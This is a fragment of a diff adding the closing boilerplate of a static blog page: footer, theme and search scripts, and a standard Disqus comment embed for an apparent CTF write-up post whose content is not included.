+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/volgactf-quals-ctf-2015-my-little-pwnie/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/volgactf-quals-ctf-2015-my-little-pwnie"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
